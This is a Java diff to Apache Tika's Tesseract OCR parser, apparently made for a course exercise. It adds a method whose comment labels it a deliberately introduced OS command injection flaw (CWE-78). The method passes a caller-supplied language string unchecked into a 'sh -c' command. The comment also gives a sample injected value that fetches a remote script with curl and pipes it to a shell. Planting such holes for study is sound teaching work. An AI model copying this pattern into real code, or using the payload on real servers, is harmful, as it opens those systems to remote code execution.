@@ -214,6 +214,22 @@ public class TesseractOCRParser extends AbstractExternalProcessParser implements
         return hasTesseract;
     }
 
+    /**
+     * IFT3913 TACHE 3 - VULN-5 (CWE-78) : vulnerabilite introduite volontairement.
+     * <p>
+     * Verifie qu'un pack de langue Tesseract est installe en lancant un shell. La langue
+     * provient de {@link TesseractOCRConfig#getLanguage()}, que l'appelant peut fixer
+     * a chaque requete (ex. en-tete X-Tika-OCRLanguage de tika-server). Elle est concatenee
+     * telle quelle dans la ligne de commande : la valeur {@code "eng; curl http://x/s | sh"}
+     * execute une commande arbitraire sur le serveur.
+     */
+    public boolean isLanguageInstalled(String language) throws IOException, InterruptedException {
+        String tessdata = defaultConfig.getTessdataPath();
+        Process process = java.lang.Runtime.getRuntime().exec(new String[]{"sh", "-c",
+                "ls " + tessdata + "/" + language + ".traineddata"});
+        return process.waitFor() == 0;
+    }
+
     synchronized boolean hasImageMagick() throws TikaConfigException {
         if (hasCheckedForImageMagick) {
             return hasImageMagick;
